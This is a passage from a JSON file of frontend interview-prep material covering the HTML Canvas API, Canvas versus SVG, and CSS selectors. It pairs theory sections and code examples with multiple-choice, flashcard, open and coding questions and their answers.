            "Frontend Interview",
            "Advanced CSS",
            "User Preferences"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "css_basics",
            "css_box_model",
            "css_units"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "min-width",
            "max-width",
            "prefers-color-scheme",
            "min-resolution",
            "mobile_first",
            "breakpoints"
          ]
        }
      ]
    }
  },
  {
    "id": "9488c877-bddd-4269-a80a-c6a63cd764c9",
    "startLine": 11600,
    "endLine": 11699,
    "processedDate": "2025-06-17T12:29:00.159Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_canvas_fundamentals",
          "title": "HTML Canvas API Fundamentals",
          "content": "The HTML Canvas API provides a powerful means for drawing graphics dynamically using JavaScript and the `<canvas>` element. It's a pixel-based drawing surface, ideal for creating a wide variety of visual content such as graphs, game graphics, custom art, and interactive visualizations.\n\n## Basic Setup and Context\nTo start drawing, you first need an HTML `<canvas>` element on your page. You then obtain its 2D rendering context using `getContext('2d')` in JavaScript.\n\n```html\n<!-- Basic canvas element -->\n<canvas id=\"myCanvas\" width=\"500\" height=\"300\"></canvas>\n```\n\nThe `width` and `height` attributes define the size of the drawing surface in pixels. If not specified, they default to 300px width and 150px height.\n\n## Core Drawing Operations\nOnce you have the 2D rendering context (commonly named `ctx`), you can use various methods to draw shapes, lines, text, and images.\n\n### Rectangles\n- `fillRect(x, y, width, height)`: Draws a filled rectangle.\n- `strokeRect(x, y, width, height)`: Draws a rectangular outline.\n- `clearRect(x, y, width, height)`: Clears the specified rectangular area, making it fully transparent. This is crucial for animations.\n\n### Paths\nPaths are sequences of lines and curves. You define a path and then `stroke` it (draw the outline) or `fill` it (fill the enclosed area).\n- `beginPath()`: Starts a new path by emptying the list of sub-paths. Call this before defining a new shape.\n- `moveTo(x, y)`: Moves the pen to the specified coordinates without drawing a line.\n- `lineTo(x, y)`: Draws a line from the current point to the specified coordinates.\n- `arc(x, y, radius, startAngle, endAngle, anticlockwise)`: Adds an arc to the path. `startAngle` and `endAngle` are in radians. `anticlockwise` is an optional boolean (default `false`).\n- `closePath()`: Connects the last point to the start point of the current sub-path, closing the shape.\n- `stroke()`: Draws the defined path outline.\n- `fill()`: Fills the defined path.\n\n### Text\n- `font = value`: Sets the font properties (e.g., '24px Arial').\n- `fillText(text, x, y, maxWidth)`: Draws filled text at the specified coordinates.\n- `strokeText(text, x, y, maxWidth)`: Draws outlined text.\n\n### Images\n- `drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight)`: Draws an image onto the canvas. It has several overloads to allow drawing entire images, or just portions of an image, and scaling them. The simplest form is `drawImage(image, x, y, width, height)`.\n\n## Animation\nCanvas animations typically involve clearing the canvas, updating the state of objects, redrawing objects in their new positions, and then requesting the next frame using `requestAnimationFrame`.\n\n- `requestAnimationFrame(callback)`: Tells the browser that you wish to perform an animation and requests that the browser call a specified function to update an animation before the next repaint. This method provides an optimized way to animate, ensuring smooth animations by syncing with the browser's repaint cycle.\n\n### Styling Properties\n- `fillStyle`: Sets the color, gradient, or pattern to use inside shapes. Can be a CSS color string, a `CanvasGradient` object, or a `CanvasPattern` object.\n- `strokeStyle`: Sets the color, gradient, or pattern to use for strokes (outlines).\n- `lineWidth`: Sets the thickness of lines.\n- `lineCap`: Sets the style of the ends of lines (`butt`, `round`, `square`).\n- `lineJoin`: Sets the style of the corners where lines meet (`round`, `bevel`, `miter`).\n- `shadowColor`, `shadowBlur`, `shadowOffsetX`, `shadowOffsetY`: Properties for adding shadows to shapes.",
          "examples": [
            {
              "id": "example_canvas_basic_drawing_1",
              "title": "Basic Canvas Drawing Operations",
              "code": "const canvas = document.getElementById('myCanvas');\nconst ctx = canvas.getContext('2d');\n\n// Drawing a filled blue rectangle\nctx.fillStyle = 'blue';\nctx.fillRect(10, 10, 150, 100); // x, y, width, height\n\n// Drawing a path (triangle outline with fill)\nctx.beginPath();\nctx.moveTo(50, 50); // Starting point\nctx.lineTo(200, 100); // Line to this point\nctx.lineTo(150, 200);\nctx.closePath(); // Connect back to start\nctx.strokeStyle = 'red';\nctx.lineWidth = 3;\nctx.stroke(); // Draw the outline\nctx.fillStyle = 'lightgreen';\nctx.fill(); // Fill the shape\n\n// Drawing a filled black circle\nctx.beginPath();\nctx.arc(250, 150, 50, 0, Math.PI * 2); // x, y, radius, start angle, end angle\nctx.fillStyle = 'black';\nctx.fill();\n\n// Drawing text\nctx.font = '24px Arial';\nctx.fillStyle = 'purple';\nctx.fillText('Hello Canvas', 150, 50); // Text, x, y",
              "explanation": "This example demonstrates how to initialize a canvas context and use fundamental drawing methods. It covers drawing rectangles, custom paths (like a triangle), circles, and text, along with setting fill and stroke styles. The `beginPath()` and `closePath()` methods are essential for defining independent shapes.",
              "language": "javascript"
            },
            {
              "id": "example_canvas_image_animation_2",
              "title": "Drawing Images and Basic Animation",
              "code": "const canvas = document.getElementById('myCanvas');\nconst ctx = canvas.getContext('2d');\n\nlet xPos = 0;\nconst img = new Image();\nimg.onload = function() {\n  function animate() {\n    // Clear canvas for next frame\n    ctx.clearRect(0, 0, canvas.width, canvas.height);\n    \n    // Update position\n    xPos = (xPos + 1) % canvas.width; \n    \n    // Draw image at new position\n    ctx.drawImage(img, xPos, 50, 100, 100); // img, x, y, width, height\n    \n    // Request next frame\n    requestAnimationFrame(animate);\n  }\n\n  // Start animation after image loads\n  animate();\n};\nimg.src = 'https://via.placeholder.com/100'; // Placeholder image",
              "explanation": "This example shows how to load and draw an image onto the canvas. It also introduces a basic animation loop using `requestAnimationFrame`. The `clearRect` method is vital here to erase previous frames before redrawing the image in its new position, creating the illusion of movement. The image `src` uses a placeholder for demonstration purposes.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "Canvas API",
            "HTML",
            "JavaScript",
            "Graphics",
            "Drawing",
            "Animation"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "HTML_DOM",
            "JavaScript_Functions",
            "JavaScript_Events"
          ],
          "complexity": 5,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "Web_Games",
            "Data_Visualization",
            "Interactive_Graphics"
          ]
        },
        {
          "id": "theory_canvas_advanced_features",
          "title": "Advanced Canvas Features: Pixels, Transformations, Gradients, and Compositing",
          "content": "Beyond basic shapes, the Canvas API offers advanced functionalities for fine-grained control over pixels, applying transformations, creating complex fills, and controlling how new drawings blend with existing content.\n\n## Pixel Manipulation\nThe Canvas API allows direct manipulation of individual pixels, which is powerful for image processing effects, custom filters, or creating pixel-perfect drawings.\n- `getImageData(sx, sy, sw, sh)`: Returns an `ImageData` object representing the underlying pixel data for a specified rectangle of the canvas.\n- `putImageData(imageData, dx, dy, dirtyX, dirtyY, dirtyWidth, dirtyHeight)`: Puts the `ImageData` object's data back onto the canvas.\n- `ImageData` Object: Contains `width`, `height`, and `data` (a `Uint8ClampedArray` where each pixel is represented by four values: R, G, B, A, in that order).\n\n## Transformations\nTransformations allow you to move, rotate, scale, and skew the canvas coordinate system itself, affecting all subsequent drawing operations.\n- `translate(x, y)`: Moves the canvas origin (0,0) by `x` and `y` units.\n- `rotate(angle)`: Rotates the canvas clockwise around its current origin by `angle` (in radians).\n- `scale(x, y)`: Scales the canvas horizontally by `x` and vertically by `y`. Values less than 1 shrink, values greater than 1 enlarge.\n- `save()`: Saves the current drawing state (including transformations, styles, and clip paths) to a stack.\n- `restore()`: Restores the most recently saved drawing state from the stack. This is crucial for applying temporary transformations.\n\n## Gradients and Patterns\nYou can use gradients for smooth color transitions and patterns for repeating images as fills.\n- `createLinearGradient(x0, y0, x1, y1)`: Creates a linear gradient object. You then add color stops using `gradient.addColorStop(offset, color)`.\n- `createRadialGradient(x0, y0, r0, x1, y1, r1)`: Creates a radial (circular) gradient object, defined by two circles. Also uses `addColorStop`.\n- `createPattern(image, repetition)`: Creates a pattern object from an image (or another canvas or video element). `repetition` can be 'repeat', 'repeat-x', 'repeat-y', or 'no-repeat'.\n\n## Compositing\nCompositing (or blend modes) defines how new shapes or images drawn onto the canvas interact with existing content.\n- `globalCompositeOperation = type`: Sets the type of compositing operation to apply. Common values include:\n    - `'source-over'` (default): New shapes are drawn on top of existing content.\n    - `'destination-over'`: New shapes are drawn behind existing content.\n    - `'source-atop'`: New shapes are drawn only where they overlap with existing content (existing content is used as a mask).\n    - `'xor'`: Areas where new and existing content overlap are made transparent.\n    - `'multiply'`, `'screen'`, `'overlay'`, etc. (similar to Photoshop blend modes).\n\nThese advanced features enable the creation of highly dynamic and visually rich canvas applications.",
          "examples": [
            {
              "id": "example_canvas_transformations_1",
              "title": "Canvas Transformations: Translate, Rotate, Scale",
              "code": "const canvas = document.getElementById('myCanvas');\nconst ctx = canvas.getContext('2d');\n\nctx.fillStyle = 'red';\nctx.fillRect(10, 10, 50, 50);\n\nctx.save(); // Save the current state\n\nctx.translate(100, 100); // Move origin to (100, 100)\nctx.rotate(Math.PI / 4); // Rotate 45 degrees (clockwise)\nctx.scale(1.5, 0.5); // Scale by 1.5x horizontally, 0.5x vertically\n\nctx.fillStyle = 'green';\nctx.fillRect(0, 0, 50, 50); // Draw rectangle at new origin (relative to translated/rotated/scaled system)\n\nctx.restore(); // Restore to the state before save()\n\nctx.fillStyle = 'blue';\nctx.fillRect(200, 10, 50, 50); // This rectangle is drawn in the original coordinate system",
              "explanation": "This example demonstrates how `translate`, `rotate`, and `scale` transform the canvas coordinate system. The `save()` and `restore()` methods are critical for applying temporary transformations to specific drawing operations without affecting subsequent independent drawings. The green rectangle is drawn relative to the transformed origin, while the red and blue rectangles are drawn in the original coordinate system.",
              "language": "javascript"
            },
            {
              "id": "example_canvas_gradients_compositing_2",
              "title": "Gradients and Compositing",
              "code": "const canvas = document.getElementById('myCanvas');\nconst ctx = canvas.getContext('2d');\n\n// Create a linear gradient\nconst linearGradient = ctx.createLinearGradient(0, 0, 200, 0);\nlinearGradient.addColorStop(0, 'purple');\nlinearGradient.addColorStop(1, 'orange');\n\nctx.fillStyle = linearGradient;\nctx.fillRect(50, 50, 200, 100);\n\n// Demonstrate compositing\nctx.fillStyle = 'rgba(0, 0, 255, 0.7)'; // Semi-transparent blue\nctx.fillRect(100, 100, 200, 100); // This overlaps the gradient\n\n// Now apply a different composite operation\nctx.globalCompositeOperation = 'multiply'; // For example, 'multiply' or 'xor'\nctx.fillStyle = 'rgba(255, 0, 0, 0.7)'; // Semi-transparent red\nctx.fillRect(150, 150, 200, 100); // This will interact differently",
              "explanation": "This example showcases how to create and apply a linear gradient as a fill style. It also demonstrates the effect of `globalCompositeOperation`. The first blue rectangle overlaps the gradient with the default 'source-over' mode. The second red rectangle, drawn after setting `globalCompositeOperation` to 'multiply', interacts with the existing content (gradient and blue rectangle) using the specified blend mode, resulting in a different visual outcome.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "Canvas API",
            "Image Processing",
            "Transformations",
            "Gradients",
            "Patterns",
            "Compositing",
            "Pixel Manipulation"
          ],
          "technology": "JavaScript",
          "prerequisites": [
            "theory_canvas_fundamentals"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "advanced",
          "requiredFor": [
            "Custom_Image_Filters",
            "Advanced_Animations",
            "Data_Visualization"
          ]
        },
        {
          "id": "theory_canvas_vs_svg",
          "title": "Canvas vs. SVG: A Comparison",
          "content": "Both Canvas and SVG (Scalable Vector Graphics) are powerful technologies for drawing graphics in the browser, but they operate on fundamentally different principles and are suited for different use cases.\n\n## Canvas\n- **Pixel-based (Raster Graphics)**: Canvas draws directly onto a bitmap. Once drawn, individual shapes are not 'remembered' by the canvas; only the pixels remain. To modify a shape, you typically clear the canvas and redraw the entire scene.\n- **Resolution-Dependent**: The graphics on a canvas can appear pixelated if scaled up beyond their original resolution. The size of the canvas element (CSS pixels) can be different from its internal drawing surface (device pixels), which can affect clarity, especially on high-DPI screens.\n- **Performance**: Generally better for complex scenes with many objects or pixel-level manipulation (e.g., games, image filters) because rendering is done directly to a bitmap, leveraging GPU acceleration.\n- **Interaction**: Interaction with individual shapes requires manual hit-testing (calculating if a mouse click falls within a shape's drawn pixels).\n- **Accessibility**: Less accessible by default, as the content is a single bitmap. Requires explicit ARIA attributes or off-screen DOM elements for accessibility.\n- **Server-Side Rendering**: Can be used server-side (e.g., with Node.js and `node-canvas`) to generate image files.\n\n## SVG\n- **Vector-based**: SVG uses XML to describe graphics as mathematical shapes (paths, circles, rectangles, text). Each shape is an independent DOM element.\n- **Resolution-Independent**: SVG graphics scale perfectly to any size or resolution without losing quality, as they are defined by vectors, not pixels.\n- **Performance**: Can become slower than Canvas for very complex scenes with an extremely large number of independent objects, as each object corresponds to a DOM element.\n- **Interaction**: Excellent for interactivity. Each SVG element is a DOM node, meaning you can attach event listeners directly to individual shapes and manipulate them easily with CSS or JavaScript.\n- **Accessibility**: Highly accessible by nature, as its content is structured XML. Text is selectable, and elements can have titles, descriptions, and be navigated by assistive technologies.\n- **CSS/JavaScript Manipulation**: Elements can be styled with CSS and manipulated with JavaScript just like regular HTML elements.\n\n## When to choose which?\n- **Choose Canvas for:**\n    - Games and animations with many moving parts.\n    - Real-time video processing or effects.\n    - Data visualizations with frequent updates or complex custom rendering (e.g., heatmaps).\n    - Drawing static images that are pixel-perfect.\n- **Choose SVG for:**\n    - Icons, logos, and illustrations that need to scale without quality loss.\n    - Interactive dashboards or charts where individual elements need to be selectable and styled dynamically.\n    - Infographics and static diagrams.\n    - Graphics that need to be easily printed at high resolution.",
          "examples": [],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "Canvas API",
            "SVG",
            "Graphics",
            "Web Development",
            "Comparison",
            "Performance"
          ],
          "technology": "HTML, SVG, JavaScript",
          "prerequisites": [
            "theory_canvas_fundamentals"
          ],
          "complexity": 6,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "Frontend_Architecture",
            "Graphics_Choosing"
          ]
        },
        {
          "id": "theory_css_selectors",
          "title": "CSS Core Concepts: CSS Selectors",
          "content": "CSS selectors are patterns used to select the HTML elements you want to style. They are the fundamental building blocks for applying styles effectively and precisely.\n\n## Basic Selectors\nThese selectors target elements based on their type, class, or ID.\n\n- `*` (Universal Selector): Selects all elements on the page.\n    ```css\n    * {\n      box-sizing: border-box;\n    }\n    ```\n- `elementName` (Type Selector): Selects all elements of a given HTML tag name.\n    ```css\n    div {\n      border: 1px solid black;\n    }\n    ```\n- `.className` (Class Selector): Selects all elements with a specific class attribute. Classes can be applied to multiple elements.\n    ```css\n    .class-name {\n      color: blue;\n    }\n    ```\n- `#idName` (ID Selector): Selects a single element with a specific ID attribute. IDs must be unique within an HTML document.\n    ```css\n    #id-name {\n      font-size: 20px;\n    }\n    ```\n\n## Attribute Selectors\nAttribute selectors target elements based on the presence or value of an HTML attribute.\n\n- `[attr]` (Presence): Selects elements that have the specified attribute, regardless of its value.\n    ```css\n    [aria-hidden] {\n      opacity: 0;\n    }\n    ```\n- `[attr=\"value\"]` (Exact Value): Selects elements where the attribute has exactly the specified value.\n    ```css\n    [type=\"submit\"] {\n      background-color: green;\n    }\n    ```\n- `[attr*=\"value\"]` (Contains Substring): Selects elements where the attribute's value contains the specified substring anywhere.\n    ```css\n    [class*=\"icon-\"] {\n      display: inline-block;\n    }\n    ```\n- `[attr^=\"value\"]` (Starts With): Selects elements where the attribute's value begins with the specified substring.\n    ```css\n    [href^=\"https://\"] {\n      color: green;\n    }\n    ```\n- `[attr$=\"value\"]` (Ends With): Selects elements where the attribute's value ends with the specified substring.\n    ```css\n    [src$=\".png\"] {\n      border: 2px solid purple;\n    }\n    ```\n- `[attr~=\"value\"]` (Contains Word): Selects elements where the attribute's value contains the specified word, separated by spaces (like a class list).\n    ```css\n    [data-tags~=\"featured\"] {\n      font-weight: bold;\n    }\n    ```\n- `[attr|=\"value\"]` (Begins With Word or Hyphen): Selects elements where the attribute's value is exactly the specified value, or starts with the value followed by a hyphen (e.g., `lang=\"en\"` or `lang=\"en-us\"`).\n    ```css\n    [lang|=\"en\"] {\n      font-family: 'Segoe UI';\n    }\n    ```\n- `[data-attribute=\"value\"]` (Custom Data Attributes): A common use case for attribute selectors is targeting custom `data-*` attributes, which are used to store custom data private to the page or application.\n    ```css\n    [data-filetype=\"image\"] {\n      border: 1px dashed grey;\n    }\n    ```\n\n## Combinators\nCombinators explain the relationship between selectors.\n\n- ` ` (Descendant Selector - space): Selects all `<span>` elements that are descendants of a `<div>` element, regardless of how deep they are nested.\n    ```css\n    div span {\n      font-style: italic;\n    }\n    ```\n- `>` (Child Selector): Selects all `<span>` elements that are direct children of a `<div>` element. It does not select grand-children or further descendants.\n    ```css\n    div > span {\n      text-decoration: underline;\n    }\n    ```",
          "examples": [
            {
              "id": "example_css_selector_types_1",
              "title": "Demonstrating Basic CSS Selectors",
              "code": "/* Universal selector - applies to all elements */\n* {\n  margin: 0;\n  padding: 0;\n  box-sizing: border-box;\n}\n\n/* Type selector - targets all paragraphs */\np {\n  color: #333;\n  line-height: 1.5;\n}\n\n/* Class selector - targets elements with class 'highlight' */\n.highlight {\n  background-color: yellow;\n}\n\n/* ID selector - targets the element with ID 'main-heading' */\n#main-heading {\n  text-align: center;\n  font-family: sans-serif;\n}",
              "explanation": "This example illustrates the four most common CSS selectors: universal, type (element), class, and ID. Each selector type is used to target elements in a specific way, from all elements on the page to a single unique element. Understanding their differences is crucial for effective CSS styling.",
              "language": "css"
            },
            {
              "id": "example_css_attribute_combinator_2",
              "title": "Attribute Selectors and Combinators",
              "code": "/* Attribute selector: targets all input elements with a 'type' attribute */\ninput[type] {\n  border: 1px solid grey;\n}\n\n/* Attribute selector: targets links whose href attribute starts with 'mailto:' */\na[href^=\"mailto:\"] {\n  color: green;\n  font-weight: bold;\n}\n\n/* Descendant combinator: targets any span inside a div */\ndiv span {\n  display: block;\n  margin-bottom: 5px;\n}\n\n/* Child combinator: targets only direct span children of a section */\nsection > span {\n  border-bottom: 1px dotted blue;\n}",
              "explanation": "This example demonstrates more advanced selectors. Attribute selectors provide fine-grained control based on element attributes, enabling styling of elements like input fields or specific types of links. Combinators (` ` for descendant and `>` for child) define relationships between selected elements, allowing for precise targeting based on nesting hierarchy. The descendant selector targets elements at any nested level, while the child selector only targets direct children.",
              "language": "css"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "CSS",
            "Selectors",
            "Styling",
            "Frontend",
            "Web Development",
            "Specificity"
          ],
          "technology": "CSS",
          "prerequisites": [
            "HTML_Elements"
          ],
          "complexity": 4,
          "interviewRelevance": 8,
          "learningPath": "beginner",
          "requiredFor": [
            "Responsive_Design",
            "CSS_Frameworks",
            "Component_Styling"
          ]
        }
      ],
      "questions": [
        {
          "id": "question_canvas_fundamentals_mcq_1",
          "topic": "Canvas Initialization and Basic Shapes",
          "level": "easy",
          "type": "mcq",
          "question": "Which of the following JavaScript code snippets correctly obtains the 2D rendering context of an HTML `<canvas>` element with the ID `myCanvas`?",
          "answer": "const canvas = document.getElementById('myCanvas'); const ctx = canvas.getContext('2d');",
          "options": [
            "const canvas = document.querySelector('canvas'); const ctx = canvas.getContext('2d');",
            "const ctx = document.getElementById('myCanvas').get2DContext();",
            "const canvas = document.getElementById('myCanvas'); const ctx = canvas.getContext('2d');",
            "const ctx = document.canvas.getContext('2d');"
          ],
          "analysisPoints": [
            "Identifies the correct method to retrieve a canvas element (getElementById).",
            "Identifies the correct method to get the 2D drawing context (`getContext('2d')`).",
            "Distinguishes between valid DOM element selection and incorrect method calls or object access."
          ],
          "keyConcepts": [
            "Canvas API initialization",
            "DOM manipulation",
            "getContext method"
          ],
          "evaluationCriteria": [
            "Understanding of fundamental Canvas setup.",
            "Knowledge of basic DOM API."
          ],
          "example": "The correct option demonstrates the standard way to get a canvas element by its ID and then call its `getContext('2d')` method to retrieve the drawing context. Other options either use incorrect methods (like `get2DContext()`) or try to access `document.canvas` which is not valid.",
          "tags": [
            "Canvas",
            "JavaScript",
            "DOM",
            "Basic"
          ],
          "prerequisites": [
            "HTML_Canvas_Element",
            "JavaScript_DOM_Access"
          ],
          "complexity": 3,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_canvas_fundamentals_flashcard_1",
          "topic": "Canvas Drawing Primitives",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary method used to clear a rectangular area on a canvas, making it transparent?",
          "answer": "`ctx.clearRect(x, y, width, height)`",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Canvas API",
            "clearRect",
            "Drawing Operations"
          ],
          "evaluationCriteria": [
            "Recall of Canvas API methods"
          ],
          "example": "",
          "tags": [
            "Canvas",
            "Flashcard",
            "Drawing"
          ],
          "prerequisites": [],
          "complexity": 2,
          "interviewFrequency": 6,
          "learningPath": "beginner"
        },
        {
          "id": "question_canvas_fundamentals_open_1",
          "topic": "Canvas Path Drawing",
          "level": "medium",
          "type": "open",
          "question": "Explain the purpose of `beginPath()`, `moveTo()`, `lineTo()`, `closePath()`, `stroke()`, and `fill()` when drawing a custom shape (path) on an HTML Canvas. Provide a brief sequence of how these methods are typically used together.",
          "answer": "When drawing a custom shape (a 'path') on the HTML Canvas, these methods are used in sequence:\n\n-   `beginPath()`: This method starts a new path. It empties the list of sub-paths, ensuring that subsequent drawing commands do not inadvertently connect to previously drawn shapes. It's like lifting your pen off the paper before starting a new drawing.\n-   `moveTo(x, y)`: This moves the 'pen' to the specified coordinates `(x, y)` without drawing a line. It sets the starting point for the new sub-path.\n-   `lineTo(x, y)`: This draws a straight line from the current 'pen' position to the specified coordinates `(x, y)`. The pen's position then moves to `(x, y)`.\n-   `closePath()`: This draws a straight line from the current 'pen' position back to the start point of the current sub-path. This is useful for automatically closing a shape, forming a polygon.\n-   `stroke()`: This method draws the actual outline of the defined path using the current `strokeStyle` and `lineWidth`. It renders what you've described with `moveTo`, `lineTo`, etc.\n-   `fill()`: This method fills the enclosed area of the defined path using the current `fillStyle`. It solidifies the shape.\n\n**Typical Sequence:**\n1.  `ctx.beginPath();` (Start a new independent drawing)\n2.  `ctx.moveTo(x1, y1);` (Define the starting point)\n3.  `ctx.lineTo(x2, y2);` (Draw lines to form the shape)\n4.  `ctx.lineTo(x3, y3);`\n5.  `ctx.closePath();` (Optional: Close the shape back to the start)\n6.  `ctx.stroke();` (Draw the outline)\n7.  `ctx.fill();` (Fill the inside)",
          "options": [],
          "analysisPoints": [
            "Correctly identifies the role of each path method.",
            "Explains the flow of path creation from `beginPath` to `stroke`/`fill`.",
            "Demonstrates understanding of how these methods interact to form a complete shape."
          ],
          "keyConcepts": [
            "Canvas Paths",
            "beginPath",
            "moveTo",
            "lineTo",
            "closePath",
            "stroke",
            "fill"
          ],
          "evaluationCriteria": [
            "Clarity and accuracy of explanations.",
            "Logical sequencing of operations."
          ],
          "example": "",
          "tags": [
            "Canvas",
            "JavaScript",
            "Drawing",
            "Paths",
            "Open-Ended"
          ],
          "prerequisites": [
            "theory_canvas_fundamentals"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "medium"
        },
        {
          "id": "question_canvas_advanced_mcq_1",
          "topic": "Canvas Transformations",
          "level": "medium",
          "type": "mcq",
          "question": "Consider the following Canvas code:\n\n```javascript\nconst canvas = document.getElementById('myCanvas');\nconst ctx = canvas.getContext('2d');\n\nctx.fillStyle = 'red';\nctx.fillRect(10, 10, 50, 50); // Square A\n\nctx.save();\nctx.translate(100, 0);\nctx.rotate(Math.PI / 2); // 90 degrees clockwise\nctx.fillStyle = 'blue';\nctx.fillRect(0, 0, 50, 50); // Square B\nctx.restore();\n\nctx.fillStyle = 'green';\nctx.fillRect(10, 70, 50, 50); // Square C\n```\n\nWhich of the following statements about the position and orientation of 'Square B' is true relative to 'Square A' and 'Square C'?",
          "answer": "Square B is drawn after the context is translated by (100,0) and then rotated 90 degrees clockwise around its new origin. Square A and C are unaffected by these transformations.",
          "options": [
            "Square B will be drawn at (110, 10) and rotated 90 degrees.",
            "Square B will be drawn at (100,0) and rotated 90 degrees clockwise relative to the canvas origin.",
            "Square B is drawn after the context is translated by (100,0) and then rotated 90 degrees clockwise around its new origin. Square A and C are unaffected by these transformations.",
            "Square B is rotated 90 degrees and then translated by (100,0) from the original context, affecting Square C."
          ],
          "analysisPoints": [
            "Understanding the order of transformations (translate then rotate).",
            "Understanding that `fillRect(0,0,...)` after transformations refers to the *new* origin.",
            "Understanding the purpose of `save()` and `restore()` in isolating transformations.",
            "Distinguishing between how transformations affect subsequent drawings versus already drawn content."
          ],
          "keyConcepts": [
            "Canvas Transformations",
            "translate",
            "rotate",
            "save",
            "restore",
            "Coordinate System"
          ],
          "evaluationCriteria": [
            "Ability to trace transformation effects.",
            "Understanding of transformation stack (`save`/`restore`)."
          ],
          "example": "The key here is that transformations apply to the coordinate system itself, affecting all *subsequent* drawing operations. `fillRect(0,0,50,50)` within the transformed state draws relative to the new origin. `save()` and `restore()` ensure that the transformations applied for Square B are local to that block of code, thus Square A (drawn before `save()`) and Square C (drawn after `restore()`) remain in the original, untransformed coordinate system. The order of transformations matters: `translate` shifts the origin, then `rotate` rotates around that *new* origin. So Square B's `(0,0)` point is the canvas's original `(100,0)` point, and then it's rotated.",
          "tags": [
            "Canvas",
            "JavaScript",
            "Transformations",
            "Medium"
          ],
          "prerequisites": [
            "theory_canvas_advanced_features"
          ],
          "complexity": 7,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_canvas_advanced_code_1",
          "topic": "Canvas Pixel Manipulation",
          "level": "hard",
          "type": "code",
          "question": "Write JavaScript code using the Canvas API to load an image, convert it to grayscale, and display the grayscale image back on the canvas. You must use `getImageData` and `putImageData`.\n\n**Requirements:**\n1.  Load an image (you can use a placeholder URL like `https://via.placeholder.com/200`).\n2.  Wait for the image to load.\n3.  Draw the image onto the canvas.\n4.  Get the image's pixel data.\n5.  Iterate through the pixel data and convert each pixel to grayscale using the formula: `gray = (R + G + B) / 3`.\n6.  Put the modified pixel data back onto the canvas.",
          "answer": "```javascript\nconst canvas = document.getElementById('myCanvas');\nconst ctx = canvas.getContext('2d');\n\nconst img = new Image();\nimg.crossOrigin = 'Anonymous'; // Required for images from different origins\nimg.src = 'https://via.placeholder.com/200/FF0000/FFFFFF?text=Original'; // Example: Red square\n\nimg.onload = () => {\n  // 3. Draw the original image onto the canvas\n  ctx.drawImage(img, 0, 0);\n\n  // 4. Get the image's pixel data\n  const imageData = ctx.getImageData(0, 0, img.width, img.height);\n  const data = imageData.data; // This is a Uint8ClampedArray\n\n  // 5. Iterate and convert to grayscale\n  for (let i = 0; i < data.length; i += 4) {\n    const r = data[i];     // Red component\n    const g = data[i + 1]; // Green component\n    const b = data[i + 2]; // Blue component\n\n    // Calculate grayscale value\n    const gray = (r + g + b) / 3;\n\n    // Set R, G, B to the grayscale value\n    data[i] = gray;     // Red\n    data[i + 1] = gray; // Green\n    data[i + 2] = gray; // Blue\n    // Alpha (data[i+3]) remains unchanged\n  }\n\n  // 6. Put the modified pixel data back onto the canvas\n  ctx.putImageData(imageData, 0, 0);\n};\n\n// Error handling for image loading\nimg.onerror = () => {\n  console.error('Failed to load image.');\n};\n```",
          "options": [],
          "analysisPoints": [
            "Correctly loads and draws an image.",
            "Properly uses `getImageData` to retrieve pixel data.",
            "Demonstrates understanding of `ImageData.data` array structure (R, G, B, A order).",
            "Applies the grayscale conversion formula correctly to each pixel's RGB components.",
            "Uses `putImageData` to display the modified data.",
            "Handles `crossOrigin` for external images."
          ],
          "keyConcepts": [
            "Canvas Image Loading",
            "Pixel Manipulation",
            "getImageData",
            "putImageData",
            "ImageData Object",
            "Grayscale Conversion"
          ],
          "evaluationCriteria": [
            "Correct implementation of pixel-level image processing.",
            "Adherence to Canvas API best practices for image loading.",
            "Algorithm correctness."
          ],
          "example": "The provided solution demonstrates the complete process. It loads an image, draws it, then extracts its pixel data. It iterates through the `data` array (which represents R, G, B, A components for each pixel sequentially) and applies the grayscale formula. Finally, it puts the modified `imageData` back onto the canvas. The `img.crossOrigin = 'Anonymous'` line is important if the image is loaded from a different domain to prevent tainted canvas errors, which would block `getImageData`.",
          "tags": [
            "Canvas",
            "JavaScript",
            "Image Processing",
            "Pixel Manipulation",
            "Hard",
            "Coding Challenge"
          ],
          "prerequisites": [
            "theory_canvas_advanced_features"
          ],
          "complexity": 8,
          "interviewFrequency": 7,
          "learningPath": "advanced"
        },
        {
          "id": "question_canvas_vs_svg_mcq_1",
          "topic": "Canvas vs. SVG Comparison",
          "level": "medium",
          "type": "mcq",
          "question": "Which of the following scenarios would typically favor the use of **SVG** over HTML Canvas?",
          "answer": "Displaying a scalable corporate logo that needs to retain crispness at any zoom level.",
          "options": [
            "Creating a real-time game with hundreds of moving sprites.",
            "Implementing a custom image filter that modifies pixel data directly.",
            "Displaying a scalable corporate logo that needs to retain crispness at any zoom level.",
            "Rendering a complex particle system simulation."
          ],
          "analysisPoints": [
            "Understands the resolution-independence of SVG.",
            "Recognizes that SVG elements are distinct and scalable.",
            "Differentiates between use cases for pixel-based (Canvas) and vector-based (SVG) graphics."
          ],
          "keyConcepts": [
            "Canvas vs SVG",
            "Resolution Dependence/Independence",
            "Vector Graphics",
            "Raster Graphics"
          ],
          "evaluationCriteria": [
            "Ability to choose appropriate technology for specific use cases.",
            "Understanding of core differences between Canvas and SVG."
          ],
